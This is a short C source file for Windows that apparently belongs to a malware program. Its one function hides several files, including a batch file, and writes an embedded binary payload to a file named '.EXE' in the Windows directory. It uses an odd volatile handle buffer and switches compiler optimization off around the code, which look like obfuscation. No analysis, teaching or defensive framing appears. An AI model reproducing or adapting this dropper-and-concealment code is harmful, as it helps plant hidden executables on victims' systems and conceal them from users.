#pragma optimize("", off)
#include "data_globals.h"
#include <windows.h>
#include <string.h>

void _HideFiles(void)
{
    // Transform HANDLE hFile
    volatile HANDLE hFile_buf[2] = {{0, (HANDLE)0}};
    volatile HANDLE *p_hFile = (volatile HANDLE *)&hFile_buf[0];

    SetFileAttributesA(_windoze2, FILE_ATTRIBUTE_HIDDEN);
    SetFileAttributesA(_sysdoze2, FILE_ATTRIBUTE_HIDDEN);
    _chdir(_windir);

    SetFileAttributesA("BBbLWDB.Bat", FILE_ATTRIBUTE_HIDDEN);

    strcpy(_L0NEPath, _windir);
    strcat(_L0NEPath, "\\.EXE");

    (*p_hFile) = CreateFileA(_L0NEPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile((*p_hFile), _L0NEInc, sizeof(_L0NEInc), NULL, NULL);
    CloseHandle((*p_hFile));
}
#pragma optimize("", on)
